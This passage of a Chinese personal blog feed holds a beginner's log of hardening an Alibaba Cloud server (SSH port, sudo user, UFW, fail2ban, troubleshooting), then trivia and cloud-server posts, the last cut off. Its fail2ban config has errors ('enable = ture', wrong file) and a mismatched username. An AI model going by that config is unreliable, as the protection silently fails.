命令并不能保证修复所有的系统漏洞，因为有些漏洞可能还没有被发现或者还没有被修复。  当然还可以利用云安全中心基础版免费检测云服务器存在的漏洞，然后根据漏洞详情自行修复，这种需要的水平就比较高了。  所以感觉要彻底修复报出来的漏洞还是需要官方的修复服务qwq- 对于Web漏洞  暂时还没有遇到，等遇到了再来更新解决方案。- 对于应用漏洞  暂时还没有遇到，等遇到了再来更新解决方案。 --><h3 id="自动修复漏洞（付费）"><a href="#自动修复漏洞（付费）" class="headerlink" title="自动修复漏洞（付费）"></a>自动修复漏洞（付费）</h3><p>最简单粗暴的方法，掏钱使用服务商的按量修复，推荐富哥使用。</p><h2 id="如何做好安全防护？"><a href="#如何做好安全防护？" class="headerlink" title="如何做好安全防护？"></a>如何做好安全防护？</h2><p>我只能尽我所能去做好服务器的安全防护，保护好我的小鸡🐥。Linux 服务器的安全防护一直是一个复杂的巨大课题。现在，我有了一台服务器，这与自己的电脑不同，它 24 小时开机，而且具有一个公网 IP，意味着人人都可能可以访问到这台服务器，就相当于已经置身于安全攻防战场的第一线，需要直面所有风险。</p><p>任何人只需要知道【IP 地址】+【端口】+【用户名】+【密码】这四个要素，就能登录你的 VPS 服务器。那很显然，这四要素的安全就是我们要防护的底线。</p><h3 id="更新安装包索引"><a href="#更新安装包索引" class="headerlink" title="更新安装包索引"></a>更新安装包索引</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure><p>保持即可，直接回车。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/14/65a3cc17bfb17.png" style="width:800px;"/></div></div>              </div>            </details></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-15</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> SSH 防护 </summary>              <div class='content'>              <h4 id="更改-SSH-端口"><a href="#更改-SSH-端口" class="headerlink" title="更改 SSH 端口"></a>更改 SSH 端口</h4><p>一般 SSH 端口默认为22，但是也有服务器提供商已经为我们修改了SSH的端口，那么你可以选择不修改，直接跳过此步。</p><ol><li>对于Linux来说，用 nano 打开 SSH 远程登录程序设置：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>  如果服务器操作系统是Windows，自行检索吧，因为很少有人用Windows去操作服务器。</p><ol start="2"><li>文件打开后，进入了 nano 的界面，重要的快捷键都显示在屏幕下方了，不用死记硬背，是不是很贴心呢？</li></ol><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/14/65a3d25c8f86c.png" style="width:800px;"/></div></div><ol start="3"><li>在打开的文件中一找到 Port 这项，并修改它的端口。Port 后面的数字就是 SSH 的端口，<strong>建议把它改成一个大于 1024 小于 65535 的整数。</strong>具体操作如下：</li></ol><ul><li>使用 ctrl+w 进入搜索模式，然后输入 Port 22 并回车</li><li>删除 22 并改成你自定义的端口号</li><li>注意：如果这一行开头有个#，说明这一行【不生效】（被注释掉了），可以在文件最后写一个不带#的，或者把#删掉就好。</li></ul><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>强烈建议用一个自己想到的其他端口，毕竟有 6 万多个端口可以自由选择。</p></div><ol start="4"><li>保存并退出配置文件</li></ol><p>  保存是 <code>ctrl+o + 回车</code>，退出是 <code>ctrl+x</code></p><p>  <strong>注意：是保存后退出，不是退出后保存</strong></p><ol start="5"><li>重启 ssh 服务，使变更生效</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service sshd restart</span><br></pre></td></tr></table></figure><p><strong>注意：为了保证你不会失联，请不要关闭当前的 ssh 登录窗口！而是另外开一个窗口来测试！</strong><br><strong>注意：为了保证你不会失联，请不要关闭当前的 ssh 登录窗口！而是另外开一个窗口来测试！</strong><br><strong>注意：为了保证你不会失联，请不要关闭当前的 ssh 登录窗口！而是另外开一个窗口来测试！</strong></p><ol start="6"><li>一般来说，现在就能使用自定义端口使用SSH服务了。但是也不绝对，就拿我使用的ECS来说。因为阿里云为了保护服务器，在默认的安全组里面，只添加了一些常用的端口号，比如22端口。所以，我还需要进入服务器的控制台，<strong>在安全组里添加自定义的端口，然后重启实例，注意必须重启实例</strong>，然后才能够使用自定义端口进行SSH连接。这种端口变换不会影响公私钥对的校验。</li></ol><p>  所以说，大家需要查看自己的服务器是否开启了我们自定义的端口号，如果默认关闭，那就需要手动开启，才能使用SSH连接。</p><h4 id="使用复杂的密码"><a href="#使用复杂的密码" class="headerlink" title="使用复杂的密码"></a>使用复杂的密码</h4><p>如果你想给当前的用户设置重新设置一个密码，那么可以到这个<a href="https://1password.com/zh-cn/password-generator/">网站</a>，生成一个复杂的密码，当作你服务器的密码。</p><p>然后使用下面的命令修改密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>出现提示让你修改密码。然后粘贴进去就行了。（注意为了安全的考量，Linux 下输入密码是没有显示的）</p><h4 id="新建普通用户"><a href="#新建普通用户" class="headerlink" title="新建普通用户"></a>新建普通用户</h4><p>为什么要普通用户？Linux 系统中的 root，不仅仅是一个管理员账号那么简单。它是整个系统的<code>根基</code>、是系统的主宰、至高无上的神。一旦 root 账号出现安全问题，整个系统就只能任人鱼肉、无处可逃。</p><ol><li>新增一个用户并设定登录密码</li></ol><p>名字可以随便起，这里以 ecsadmin 为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser ecsadmin</span><br></pre></td></tr></table></figure><p>执行命令后，根据提示操作即可。务必设置一个用户密码（设置密码时是看不到的）。之后系统会询问一些用户的附加信息，可以无视，一路回车即可。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/14/65a3dcf120365.png" style="width:800px;"/></div></div><ol start="2"><li>安装 sudo 功能</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install sudo  <span class="comment">#Debain默认没有，Ubuntu自身应该是已经有安装的</span></span><br></pre></td></tr></table></figure><ol start="3"><li>把 ecsadmin 用户加入 sudo 名单里</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visudo</span><br></pre></td></tr></table></figure><p>在 <code>User Privilege Specification</code> 下加入一行 <code>ecsadmin ALL=(ALL) NOPASSWD: ALL</code> 即可。</p><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>NOPASSWD 这个设置，它的意思是 ecsadmin 用户临时使用 root 权限时，不用额外输入密码。如果你希望遵守传统习惯，每次使用 sudo 时需要输入密码，那么这一行改成 vpsadmin ALL&#x3D;(ALL:ALL) ALL 即可。</p></div><h4 id="禁止-root-登陆"><a href="#禁止-root-登陆" class="headerlink" title="禁止 root 登陆"></a>禁止 root 登陆</h4><ol><li>用 nano 编辑器打开 SSH远程登录程序设置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><ol start="2"><li>找到 PermitRootLogin Yes 这一项，然后把它后面的设定值改为 no 即可</li><li>保存文件并退出</li><li>重启 ssh 服务，让变更生效</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service sshd restart</span><br></pre></td></tr></table></figure>              </div>            </details></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-21</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> 全局防护 </summary>              <div class='content'>              <h3 id="安装并配置-UFW-防火墙"><a href="#安装并配置-UFW-防火墙" class="headerlink" title="安装并配置 UFW 防火墙"></a>安装并配置 UFW 防火墙</h3><ol><li>Ubuntu 默认自己已经是自带 ufw 防火墙了，只是没有启动而已（如果是 Debian 的话，需要安装）</li></ol><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ufw</span><br></pre></td></tr></table></figure><ol start="2"><li>设置 ufw 使用默认值</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ufw default deny incoming</span><br><span class="line">ufw default allow outgoing</span><br></pre></td></tr></table></figure><ol start="3"><li>允许 SSH 连接</li></ol><p>没有改SSH端口设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw allow ssh</span><br></pre></td></tr></table></figure><p>使用自定义SSH端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw allow 自定义端口号/tcp comment <span class="string">&#x27;SSH&#x27;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>允许 http 连接</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw allow http</span><br></pre></td></tr></table></figure><ol start="5"><li>允许 https 连接</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw allow https</span><br></pre></td></tr></table></figure><ol start="6"><li>启动 ufw 防火墙</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/14/65a3e90abd0fb.png"/></div></div><ol start="7"><li>查看 ufw 防火墙状态</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ufw status</span><br><span class="line">ufw status numbered</span><br></pre></td></tr></table></figure><ol start="8"><li>其他</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ufw delete 5 <span class="comment">#删除一条规则</span></span><br><span class="line">ufw reload   <span class="comment">#重载配置</span></span><br></pre></td></tr></table></figure><h3 id="禁止-Ping"><a href="#禁止-Ping" class="headerlink" title="禁止 Ping"></a>禁止 Ping</h3><ul><li><p>宝塔用户<br>如果是宝塔用户，可以在这边禁止 Ping</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/17/65a76442b05d2.png"/></div></div></li><li><p>未安装宝塔的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/ufw/before.rules</span><br></pre></td></tr></table></figure><p><code>crl+w</code>搜索：<code>echo-request</code>，把 <code>ACCEPT</code> 改成 <code>DROP</code></p></li></ul><h3 id="禁止暴力破解"><a href="#禁止暴力破解" class="headerlink" title="禁止暴力破解"></a>禁止暴力破解</h3><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>这一步如果大家使用的是SSH公私钥对连接的话就没必要配置了，因为只要保证你的私钥不泄露，就基本能够保证不被暴力破解。感兴趣的可以去了解一下RSA加密通信的相关知识。其实，使用SSH连接远程仓库的时候，有些教程会教大家生成私钥，这个生成的私钥一般就在用户文件夹下的.ssh里面，就是通过RSA加密算法得到的。</p></div><p>安装 Fail2ban</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install fail2ban</span><br></pre></td></tr></table></figure><p>进入文件夹，先做好备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/fail2ban <span class="comment"># 进入fail2ban目录</span></span><br><span class="line">sudo <span class="built_in">cp</span> fail2ban.conf fail2ban.local  <span class="comment"># 复制一份配置文件 </span></span><br></pre></td></tr></table></figure><p>打开编辑fail2ban.local文件，默认的是没有配置的，我们加入一个配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[sshd]</span><br><span class="line"><span class="built_in">enable</span> = ture</span><br><span class="line">port = 9753   <span class="comment"># 注意改成自己对应的端口</span></span><br><span class="line">filter =sshd</span><br><span class="line">logpath = /var/log/auth.log</span><br><span class="line">maxretry = 3</span><br><span class="line">bantime = -1</span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/17/65a765f9d0221.png"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service fail2ban restart    <span class="comment">#重启</span></span><br><span class="line">sudo fail2ban-client status      <span class="comment">#查看状态</span></span><br><span class="line">sudo fail2ban-client status sshd <span class="comment">#查看sshd的详细状态</span></span><br></pre></td></tr></table></figure>解禁指定IP，这里的IP需要自定义<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fail2ban-client <span class="built_in">set</span> sshd unbanip 192.0.0.1 <span class="comment">#解禁指定IP，这里的IP需要自定义</span></span><br></pre></td></tr></table></figure>              </div>            </details></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-27</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> 尽量使用反向代理 </summary>              <div class='content'>              <div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>使用宝塔的同学建议更改一下默认的8888端口，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bt</span><br></pre></td></tr></table></figure><p>就能进入修改面板，大家自己修改即可。</p></div><p>我使用 Nginx Proxy Manager 做反向代理，具体搭建请参考<a href="https://blog.xxfer.cn/posts/79f9b780.html">Nginx Proxy Manager</a></p>              </div>            </details></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-25</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> SSH远程登录异常 </summary>              <div class='content'>              <p>今天使用服务器的时候，本来使用SSH连接得好好的，突然断开了连接。再次尝试连接显示超时：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/02/28/65df09ee684d1.jpg"/></div></div>最后联系了阿里云售后小哥哥解决了问题：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/02/28/65df0c7d2dab5.png" style="width:650px;"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/02/28/65df0d4cc296f.png" style="width:650px;"/></div></div>我遇到的大概率就是内存满了，毕竟好多容器在跑。重启实例以后，就恢复了连接，给阿里云售后点赞。<p>既然遇到了这个问题，我还是想要总结记录一下关于服务器SSH连接失败的原因及排查、解决方案。</p><p>一般SSH连接失败的原因会有这几个：</p><ul><li>服务器端或客户端的<strong>防火墙</strong>设置了关闭空闲连接的规则，导致长时间没有数据交互的SSH连接被断开</li><li>服务器端或客户端的<strong>网络环境不稳定</strong>，导致SSH连接丢包或延迟过高，无法正常通信</li></ul><p>我觉得上面这些应该不太会发生在大部分人身上，或者说大多数问题并不是由上面的因素造成的。还有：</p><ul><li>就是主机内存满了，需要清理。<br>具体原因：<br>首先，我们要知道 Linux 系统为了提高内存的利用率，会把一些不常用的内存数据交换到硬盘上，形成一个 swap 分区。这样，当内存不足时，系统可以从 swap 分区中调用一些数据回到内存中，释放一些空间给其他进程使用。<br>然而，如果系统的内存和 swap 分区都被占满了，那么系统就会面临一个严重的问题，就是没有足够的内存来运行新的进程或者服务。这时，系统会启动一个叫做 OOM Killer 的机制，来杀死一些占用内存较多的进程，以便释放一些内存空间。<br>但是，这个机制并不是完美的，有时候它会杀死一些重要的进程，导致系统不稳定或者崩溃。而且，这个机制也不是及时的，有时候在它启动之前，系统已经陷入了无法响应的状态。<br>SSH 服务是一个基于 TCP 协议的远程登录服务，它需要在服务器端和客户端之间建立一个加密的通道，来传输数据和命令。这个通道的建立需要经过几个步骤，其中最关键的一步是服务器端和客户端之间的密钥交换，也就是所谓的 handshake 。<br>如果服务器的内存和 swap 分区都满了，那么服务器可能无法为 SSH 服务分配足够的内存空间，导致 SSH 服务无法正常运行或者响应客户端的请求。这样，客户端就会一直等待服务器的回应，直到超时或者断开连接。</li></ul><p>因此，最快的处理方式就是重启实例。重启实例时，在内存中未保存到磁盘的数据会丢失，从而释放内存空间。</p><p>下面仔细看一下上面的排查过程：</p><ol><li>使用<strong>ping命令</strong>检查网络连通性：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping [<span class="variable">$ECS_IP</span>]</span><br></pre></td></tr></table></figure></li></ol><ul><li>如上图所示，服务器运行中，并且没有丢包现象，说明网络正常。</li><li>如果存在丢包现象，说明网络存在波动，尝试更换时间段或本地网络后重新进行测试。</li><li>如果ping不同，那就有多种可能：ECS实例未运行、防火墙设置等，需要逐一排查。</li></ul><ol start="2"><li>使用<strong>telnet命令</strong>检查远程连接端口的可用性，一般就是指22端口：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet [<span class="variable">$ECS_IP</span>] [<span class="variable">$Port</span>]</span><br></pre></td></tr></table></figure></li></ol><ul><li>可以访问远程连接端口，说明网络和远程连接服务正常。</li><li>无法访问远程连接端口，可能是由于安全组规则、RDP或SSH服务未运行、防火墙设置等，无法访问远程连接的端口。</li></ul><ol start="3"><li>使用<strong>ssh命令</strong>检查远程连接时的报错<br>通过报错信息：<strong>Timed out while waiting for handshake</strong>可以推断有可能是内存占用满了。</li></ol><p><strong>一般来说，内存被占满，肯定是有一项进程负荷太大。像我就是因为部署一个容器的时候，其他还挂着好几个容器，然后就炸了。所以，大家可能需要多注意一下自己的服务器配置，一些非必要的容器也不要一直挂着。</strong></p><p>另外，在网上查找解决方案是发现的宝藏博客，供大家学习:</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.cnblogs.com/guobaiwang/articles/12610439.html">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">SSH远程连接不了服务器的故障及排查故障的步骤</div>            <div class="tag-link-sitename">叶宇梵</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>              </div>            </details></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-28</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> AK泄露，调用异常行为 </summary>              <div class='content'>              <div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>大家还是要注意，一些不明来路的脚本文件尽量不要下载。</p></div><p>下午收到官方的电话和短信的通知，说我的AK泄露了，并存在异常调用行为：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/02/28/65df1f0b66a6b.png"/></div></div>这是怎么回事呢？于是去咨询了售后，结果是虚惊一场，但不知道为什么系统告警了。之后，我把原先的AK删除，创建了新的，直接从根源解决问题。              </div>            </details></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>03-01</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> 阿里云服务器监控插件安装 </summary>              <div class='content'>              <p>由于之前SSH断联以后，咨询售后得知原因可能时内存占用过多，但是之后几天还是出现崩掉的情况，需要重启才能恢复正常。所以今天尝试安装阿里云自带的监控插件，可以实时<strong>监控内存使用情况</strong>。其实我觉得有些奇怪，在服务器刚到手的时候，我就设置了4GB的SWAP交换空间，就是用来预防内存不够用的情况，但是还是出现了问题。而且还频繁出现这类问题，那就不得不好好研究解决一下了。</p><p>安装了官方的监控插件以后，确实看到服务器的内存使用率很高，而且居高不下，但还没有用到交换空间，目前还没有找到问题所在。。。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/01/65e1db9430501.png"/></div></div>              </div>            </details></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>03-07</p></div></div><div class='timeline-item-content'><details class="folding-tag" green><summary> Docker内存占用过高问题排查解决 </summary>              <div class='content'>              <div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://blog.xxfer.cn/posts/ce251794.html">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/10/31/65408016573a9.jpg)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">排查Docker容器内存占用问题记录</div>            <div class="tag-link-sitename">小李同学</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>              </div>            </details></div></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="等待更新......" style="width:360px;"/></div></div>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECS </tag>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>奇怪的知识又增加了( •̀ ω •́ )y</title>
      <link href="/posts/49fa10ba.html"/>
      <url>/posts/49fa10ba.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/30/658f82128af32.png</cover>
      <date>Fri Dec 29 2023 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在这里我会分享一些新学习到的“知识点”，知道的勿喷( •̀ ω •́ )y</p><h2 id="BGM-OST"><a href="#BGM-OST" class="headerlink" title="BGM &amp; OST"></a>BGM &amp; OST</h2><p>BGM通常出现在游戏的setting里面。通常有Sound、BGM等的音量大小可调控。你玩FIFA还可以有Speech可以调。</p><p>BGM的全称是：Background Music。虽然和OST一样同为烘托氛围的作用，但是在咖啡厅、西餐厅、书店里面的那些，你只能说是BGM。</p><p>OST的全称是Original Sound Track，也就是影视原声。它的功能上，和BGM有一部分的重叠，但OST本身是需要被发行，才叫做OST的。它必须要影视制作公司拿出来发行，否则就不叫做OST了。</p><h2 id="多巴胺-an-？！"><a href="#多巴胺-an-？！" class="headerlink" title="多巴胺(àn)？！"></a>多巴胺(àn)？！</h2><p>“多巴胺”本身是一种神经传导物质，同时也是一种激素，能够让人产生愉悦的感觉。2023年，色彩鲜艳的“多巴胺穿搭”成了时尚潮流，“多巴胺”也引申出“快乐因子”的含义，成为流行语，广泛使用。“多巴胺”的“胺”经常被误读为ān，其实正确读音是àn。“胺”是氨分子中部分或全部氢原子被烃基取代而成的有机化合物。常容易读错的还有“三聚氰胺”。</p><h2 id="“账号”误为“帐号”"><a href="#“账号”误为“帐号”" class="headerlink" title="“账号”误为“帐号”"></a>“账号”误为“帐号”</h2><p>2023年7月，话题“账与帐很多人分不清”冲上热搜。生活中，许多网站和手机应用软件都将“账号”误为“帐号”。古汉语中，“帐”可通“账”。但是，2001年发布的《第一批异形词整理表》对二字明确分工如下：“账”用于货币和货物出入的记载、债务等，如账本、报账、借账、还账；“帐”专表用布、纱、绸子等制成的遮蔽物，如蚊帐、帐篷。“账号”本指单位或个人跟银行建立经济关系后，银行在账上给该单位或个人所编的号码，与货币等有关；后由此义引申，指用户访问计算机系统或使用某些资源时使用的识别码。因此，表示用户识别码时，“账号”才是正确词形。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="持续更新......" style="width:360px;"/></div></div>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玩梗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一台云服务器——阿里云服务器 ECS</title>
      <link href="/posts/9a5ae3b8.html"/>
      <url>/posts/9a5ae3b8.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e8659368162.png</cover>
      <date>Thu Dec 28 2023 20:44:33 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="纪念我的第一台云服务器"><a href="#纪念我的第一台云服务器" class="headerlink" title="纪念我的第一台云服务器"></a>纪念我的第一台云服务器</h2><p>不知不觉得，建站也有段时间了。学到了不少前端后端的知识，同时也算是巩固和实践了不少之前所学。还想要继续深入学习下去，但是，相信不少同学在建站过程中和我一样，总会觉得缺了点什么。我想服务器应该就是其中之一，因为缺少服务器，很多东西都是寸步难行。</p><p>因此，趁着阿里云推出的双十一优惠，买了一台属于自己的云服务器ECS。之后我会在本站分享零基础学习云服务器的使用心得与体会，记录我的云服务器学习使用之路。当然，在探索到好用的小技巧，肯定会分享给大家。下面我们来看看服务器的魅力所在吧~</p><h2 id="什么是服务器？"><a href="#什么是服务器？" class="headerlink" title="什么是服务器？"></a>什么是服务器？</h2><p>说到服务器，相信大家都不陌生，大家会说服务器是一台特殊的主机或者说是网络中能对其它机器提供某些服务的计算机系统。没错，它就是一台为电脑提供服务的电脑。只是它在软件和硬件层面做了某些专门化设计。如果把电脑比作人类，那么服务器就是一个某一专业能力非常突出的人。</p><p>一般最常见的应该是Web服务器，顾名思义，它是专门用来响应大家的访问请求的。除此之外，还有文件服务器、数据库服务器也是两种比较常见的服务器类型。</p><p>因为服务器具有的特定功能，所以一般服务器的外观也和我们平时使用的电脑有所不同。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/28/658d8defaf19b.jpg" alt="一台服务器示例" style="width:360px;"/></div></div><p>上文也提到了，它们在软件和硬件层面也都与普通电脑不同。</p><p>软件层面，比如服务器的操作系统一般不会用家用或者商用的这些windows旗舰版啥的，它们可能是windows服务器版，可能是Unix，Linux操作系统，这些操作系统也会针对服务器的工作情况，在安全性，稳定性，性能等方面有所侧重。</p><p>硬件层面，因为可能要被用来给很多人同时访问，因为要全年无休，而且要提供稳定的服务，所以在硬件设计上可能会更加的追求稳定性，可靠性，配置上也会有侧重性，比如前面说的文件服务器，那肯定会要求非常非常大的硬盘空间，硬盘的可靠性比普通家用硬盘的可靠性也高很多，然后这些服务器要面对大并发的数据处理，可能CPU也会很强劲，当然，他们都用不着独立显卡的，因为他们都不需要显示输出的，只有维护的时候才拖一台显示器去接上临时用一下。</p><h2 id="什么是云服务器？"><a href="#什么是云服务器？" class="headerlink" title="什么是云服务器？"></a>什么是云服务器？</h2><p>想要了解云服务器，可能需要知道虚拟主机、VPS、云服务器三者的区别：</p><h4 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h4><p>虚拟主机相对于其他两种云主机的主要区别就是，虚拟主机无需用户部署网站环境，通常默认支持多种建站环境，用户直接上传建站程序安装就可以使用。由于虚拟机空间不支持连接到桌面进行其他操作，所以一般服务器租用商都会提供一个控制面板，可以进行域名绑定、文件解压缩等简单操作。</p><p>从技术角度来讲，虚拟主机是使用特殊的软硬件技术，把一台真实的物理电脑主机分割成多个的逻辑存储单元，每个单元都没有物理实体，但是每一个逻辑存储单元都能像真实的物理主机一样在网络上工作，具有单独的域名、IP地址(或共享的IP地址)以及完整的Internet服务器功能。</p><h4 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h4><p>VPS主机是通过使用VPS(Virtual Private Server 虚拟专用服务器)技术，将一部服务器分割成多个虚拟专享服务器的优质服务，也就是由一台真实主机虚拟成多个小主机。每个VPS都可分配独立公网IP地址、独立操作系统、独立空间、独立内存、独立CPU资源等，可以远程连接到桌面，相当于一台功能完整的电脑;用户除了可以自行分配多个虚拟主机及无限企业邮箱外，还可以根据需求自行更换操作系统、安装程序、部署环境以及重启服务器，也就是说VPS主机相对虚拟主机来说更高一级，自由度更高。</p><h4 id="云服务器"><a href="#云服务器" class="headerlink" title="云服务器"></a>云服务器</h4><p>上面所说的VPS主机是由一台真实主机虚拟成多个小主机，性能往往得不到保障，那么云服务器又怎样的呢?但话又说回来，VPS发展了这么多年，拥有非常成熟的方案，一般中小型的企业也会有VPS的业务，但是云产品就不一样了。因为云服务器往往需要企业根据自身需求条件自研一套资源分配的方案，不像VPS那样抄作业就行，所以一般只有大厂会有云服务器的业务。</p><p>云服务器利用的是更先进的集群技术，在一组集群服务器上虚拟出多个类似独立服务器的部分，集群中每个服务器上都有云服务器的一个镜像，从而大大提高了虚拟服务器的安全稳定性，除非所有的集群内服务器全部出现问题，云服务器才会无法访问。所以，云服务器相对于VPS主机来说又更高一个级别，稳定性、安全性更高。</p><p><strong>虚拟主机 &lt; VPS &lt; 云服务器</strong></p><h2 id="有什么用？"><a href="#有什么用？" class="headerlink" 